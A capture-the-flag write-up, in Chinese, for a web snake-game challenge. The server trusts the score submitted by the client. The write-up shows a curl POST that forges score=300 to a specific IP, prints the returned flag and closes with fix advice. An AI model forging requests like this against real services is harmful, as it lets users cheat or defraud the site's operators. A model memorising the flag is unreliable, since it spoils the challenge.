# Snake Game Challenge — Writeup

## 题目信息

- **URL**: http://120.27.146.76:29459
- **服务器**: Apache/2.4.54 (Debian) + PHP/7.4.33
- **类型**: Web - 客户端逻辑绕过

## 题目分析

访问首页后看到一个贪吃蛇游戏，规则是使用方向键操控蛇吃食物，每吃一个 +10 分，累计 300 分即可获得 FLAG。

### 关键代码分析

前端 JavaScript 中 `checkWin()` 函数负责将分数提交到服务端：

```javascript
function checkWin(s) {
    let formData = new FormData();
    formData.append('score', s);
    fetch('index.php', { method: 'POST', body: formData })
    .then(r => r.json())
    .then(data => {
        if(data.status === 'success') {
            msgEl.innerText = data.flag;
        }
    });
}
```

漏洞点：**分数完全由客户端控制，服务端没有对游戏状态做任何校验**。`checkWin()` 接收的 `s` 参数来自前端变量 `score`，而 POST 请求可以直接伪造。

## 利用步骤

直接用 curl 向 `index.php` 发送 POST 请求，传递 `score=300`：

```bash
curl -s -X POST http://120.27.146.76:29459/index.php -d 'score=300'
```

### 响应

```json
{
    "status": "success",
    "message": "Congratulations!",
    "flag": "flag{5cf1ef3539860b778211db423b4f6558}"
}
```

## Flag

```
flag{5cf1ef3539860b778211db423b4f6558}
```

## 总结

这是一道典型的**客户端状态信任**漏洞题。核心问题：

1. 游戏得分 `score` 完全在客户端计算和维护
2. 服务端接收分数后直接判断是否 >= 300，没有做任何合法性校验（如游戏状态回放、服务端同步验证、签名等）
3. 攻击者可以直接伪造 HTTP 请求绕过游戏逻辑

### 修复建议

- 服务端应维护游戏状态，客户端每次操作同步到服务端验证
- 对分数提交做签名校验（HMAC），防止篡改
- 或在服务端完整运行游戏逻辑，客户端仅做渲染和输入采集
